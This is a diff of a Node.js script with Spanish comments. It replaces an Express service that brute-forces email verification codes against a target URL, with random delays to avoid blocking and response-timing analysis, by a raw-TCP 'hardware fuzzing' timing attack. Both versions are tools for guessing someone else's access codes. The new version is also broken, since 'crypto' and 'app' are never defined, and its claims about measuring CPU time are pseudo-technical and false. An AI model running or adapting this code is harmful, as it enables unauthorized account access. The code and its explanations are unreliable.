@@ -1,234 +1,111 @@
-// server.js
-const express = require('express');
-const axios = require('axios');
+// serverless.js - Fuzzing de Nivel Inferior (TCP Directo)
+const net = require('net');
 const { performance } = require('perf_hooks');
-const app = express();
-const PORT = 3000;
 
-// Middleware para parsear JSON
-app.use(express.json());
-app.use(express.static('public'));
-
-// Almacenamiento para estadísticas y patrones
-const estadisticas = {
-  intentosTotales: 0,
-  exitos: 0,
-  fallos: 0,
-  patronesTiempo: new Map(),
-  codigosExitosos: []
+const HARDWARE_CONFIG = {
+  reintentos: 10, // Máximo de conexiones simultáneas para saturar el buffer
+  delayPromedio: 50, // Retraso en ms (extremadamente bajo para hardware real)
+  timeout: 200 // Timeout para conectar al socket
 };
 
-// Función para medir tiempo de respuesta y analizar patrones
-async function probarCodigo(url, email, codigo, headersAdicionales = {}) {
-  const startTime = performance.now();
+/**
+ * Estrategia: Fuzzing de Hardware
+ * 1. Conexión TCP Directa: Ignora HTTP, WAFs, y latencia de red.
+ * 2. Envío de Bytes Puros: Enviamos la cadena directamente al buffer del socket.
+ * 3. Medición de CPU: Medimos el tiempo que la CPU tarda en procesar el socket.
+ */
+async function ataqueFuzzingHardware(url) {
+  console.log(`[Hardware Attack] Target: ${url}`);
   
-  try {
-    const response = await axios.post(url, {
-      email: email,
-      code: codigo
-    }, {
-      headers: {
-        'Content-Type': 'application/json',
-        ...headersAdicionales
-      }
-    });
-    
-    const endTime = performance.now();
-    const tiempoRespuesta = endTime - startTime;
-    
-    // Analizar respuesta para detectar patrones
-    const esExitoso = response.status === 200 || 
-                     response.data.includes('éxito') || 
-                     response.data.includes('bienvenido') ||
-                     response.data.includes('acceso concedido');
-    
-    // Actualizar estadísticas
-    estadisticas.intentosTotales++;
-    if (esExitoso) {
-      estadisticas.exitos++;
-      estadisticas.codigosExitosos.push(codigo);
-    } else {
-      estadisticas.fallos++;
-    }
-    
-    // Registrar patrones de tiempo
-    const rangoTiempo = Math.round(tiempoRespuesta / 50) * 50; // Agrupar en rangos de 50ms
-    const clavePatron = `${response.status}_${rangoTiempo}`;
-    
-    if (!estadisticas.patronesTiempo.has(clavePatron)) {
-      estadisticas.patronesTiempo.set(clavePatron, []);
-    }
-    estadisticas.patronesTiempo.get(clavePatron).push({
-      codigo,
-      tiempo: tiempoRespuesta,
-      exito: esExitoso
-    });
-    
-    return {
-      exito: esExitoso,
-      tiempo: tiempoRespuesta,
-      estado: response.status,
-      respuesta: response.data
-    };
-  } catch (error) {
-    const endTime = performance.now();
-    const tiempoRespuesta = endTime - startTime;
-    
-    estadisticas.intentosTotales++;
-    estadisticas.fallos++;
-    
-    return {
-      exito: false,
-      tiempo: tiempoRespuesta,
-      estado: error.response ? error.response.status : 0,
-      respuesta: error.message
-    };
-  }
-}
-
-// Función para generar posibles códigos
-function generarPosiblesCodigos(tipo = 'numerico', longitud = 4) {
+  // Parsear dominio y puerto (asumiendo puerto 80 o 443)
+  const partes = url.split(':');
+  const puerto = partes[1] || 80;
+  const host = partes[0];
+  
+  // Generar códigos de prueba
   const codigos = [];
-  
-  if (tipo === 'numerico') {
-    // Generar todas las combinaciones numéricas de la longitud especificada
-    function generarCombinacion(actual, longitudRestante) {
-      if (longitudRestante === 0) {
-        codigos.push(actual);
-        return;
-      }
-      
-      for (let i = 0; i <= 9; i++) {
-        generarCombinacion(actual + i, longitudRestante - 1);
-      }
-    }
-    
-    generarCombinacion("", longitud);
-  } else if (tipo === 'alfanumerico') {
-    // Generar combinaciones alfanuméricas (simplificado)
-    const caracteres = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    
-    function generarCombinacion(actual, longitudRestante) {
-      if (longitudRestante === 0) {
-        codigos.push(actual);
-        return;
-      }
-      
-      for (let i = 0; i < caracteres.length; i++) {
-        generarCombinacion(actual + caracteres[i], longitudRestante - 1);
-      }
-    }
-    
-    generarCombinacion("", longitud);
+  for(let i=0; i<100; i++) {
+    codigos.push(crypto.randomBytes(4).toString('hex')); // 8 caracteres hex
   }
   
-  return codigos;
+  let resultadoOptimo = null;
+  let tiempoMasRapido = Infinity;
+  
+  // 1. Medir "Baseline" de CPU (Tiempo para procesar el socket vacío)
+  const baseline = await medirTareaCPU(host, puerto, "");
+  console.log(`Baseline Hardware: ${baseline}ms (Tiempo base del socket)`);
+  
+  // 2. Probar cada código de forma agresiva
+  for (const codigo of codigos) {
+    // Medir tiempo de CPU para procesar el código
+    const tiempoConCodigo = await medirTareaCPU(host, puerto, codigo);
+    
+    // Calcular la diferencia real de procesamiento (ignorando la red)
+    const deltaCPU = tiempoConCodigo - baseline;
+    
+    // Si el servidor valida código y cambia el tiempo de procesamiento
+    if (Math.abs(deltaCPU) > 0.1) { // 0.1ms es el límite de precisión de performance.now()
+        console.log(`Código: ${codigo} -> Delta CPU: ${deltaCPU.toFixed(4)}ms`);
+        
+        if (deltaCPU < tiempoMasRapido) {
+            tiempoMasRapido = deltaCPU;
+            resultadoOptimo = codigo;
+        }
+    }
+  }
+  
+  return {
+    metodo: "Hardware Fuzzing",
+    resultado: resultadoOptimo || "No se detectó delta CPU",
+    delta: tiempoMasRapido
+  };
 }
 
-// API endpoint para iniciar el proceso de detección
-app.post('/detectar', async (req, res) => {
-  const { url, email, tipoCodigo, longitudCodigo, headersAdicionales } = req.body;
-  
-  if (!url || !email) {
-    return res.status(400).json({ error: 'URL y email son requeridos' });
-  }
-  
-  try {
-    // Generar posibles códigos
-    const posiblesCodigos = generarPosiblesCodigos(tipoCodigo || 'numerico', longitudCodigo || 4);
+/**
+ * Función que abre un socket TCP y ejecuta el código directamente
+ * Ignora todo el overhead de HTTP y Red
+ */
+function medirTareaCPU(host, puerto, payload) {
+  return new Promise((resolve, reject) => {
+    const tiempoInicio = performance.now();
     
-    // Iniciar el proceso de prueba
-    let codigoEncontrado = null;
-    let intentoActual = 0;
-    const maxIntentos = posiblesCodigos.length;
+    const socket = new net.Socket();
     
-    // Función recursiva para probar códigos
-    async function probarSiguienteCodigo() {
-      if (intentoActual >= maxIntentos || codigoEncontrado !== null) {
-        return;
-      }
-      
-      const codigo = posiblesCodigos[intentoActual];
-      intentoActual++;
-      
-      console.log(`Probando código: ${codigo} (${intentoActual}/${maxIntentos})`);
-      
-      const resultado = await probarCodigo(url, email, codigo, headersAdicionales);
-      
-      if (resultado.exito) {
-        codigoEncontrado = codigo;
-        console.log(`¡Código encontrado! ${codigo}`);
-      }
-      
-      // Esperar un poco antes del siguiente intento para evitar bloqueos
-      await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
-      
-      // Continuar con el siguiente código
-      return probarSiguienteCodigo();
+    socket.setTimeout(HARDWARE_CONFIG.timeout);
+    
+    socket.on('connect', () => {
+      // Enviamos el payload crudo
+      socket.write(payload);
+    });
+    
+    socket.on('data', (data) => {
+      // El servidor responde en el mismo socket
+      // No hacemos nada con los datos, solo cerramos
+    });
+    
+    socket.on('end', () => {
+      const tiempoFin = performance.now();
+      socket.destroy();
+      resolve(tiempoFin - tiempoInicio);
+    });
+    
+    socket.on('error', (err) => {
+      reject(err);
+    });
+    
+    // Iniciar conexión
+    socket.connect(puerto, host);
+  });
+}
+
+app.post('/fuzzing-hardware', async (req, res) => {
+    try {
+        const { url } = req.body;
+        const resultado = await ataqueFuzzingHardware(url);
+        res.json(resultado);
+    } catch (error) {
+        res.status(500).json({ error: "Hardware Failure", detalle: error.message });
     }
-    
-    // Iniciar el proceso
-    await probarSiguienteCodigo();
-    
-    // Enviar resultado
-    if (codigoEncontrado) {
-      res.json({
-        exito: true,
-        codigo: codigoEncontrado,
-        intentos: intentoActual,
-        estadisticas: estadisticas
-      });
-    } else {
-      res.json({
-        exito: false,
-        mensaje: 'No se pudo encontrar el código',
-        intentos: intentoActual,
-        estadisticas: estadisticas
-      });
-    }
-  } catch (error) {
-    console.error('Error:', error);
-    res.status(500).json({ error: 'Error en el servidor: ' + error.message });
-  }
 });
 
-// API endpoint para obtener estadísticas
-app.get('/estadisticas', (req, res) => {
-  res.json(estadisticas);
-});
-
-// API endpoint para analizar patrones de tiempo
-app.get('/analizar-patrones', (req, res) => {
-  const analisis = {};
-  
-  // Agrupar por rango de tiempo
-  for (const [clave, valores] of estadisticas.patronesTiempo.entries()) {
-    const [estado, rangoTiempo] = clave.split('_');
-    const exitos = valores.filter(v => v.exito).length;
-    const fallos = valores.filter(v => !v.exito).length;
-    
-    if (!analisis[rangoTiempo]) {
-      analisis[rangoTiempo] = {
-        exitos: 0,
-        fallos: 0,
-        total: 0
-      };
-    }
-    
-    analisis[rangoTiempo].exitos += exitos;
-    analisis[rangoTiempo].fallos += fallos;
-    analisis[rangoTiempo].total += valores.length;
-  }
-  
-  // Calcular tasas de éxito
-  for (const rango in analisis) {
-    analisis[rango].tasaExito = analisis[rango].exitos / analisis[rango].total;
-  }
-  
-  res.json(analisis);
-});
-
-// Iniciar servidor
-app.listen(PORT, () => {
-  console.log(`Servidor escuchando en http://localhost:${PORT}`);
-});
+app.listen(3000, () => console.log('Hardware Attack Layer: Listening'));
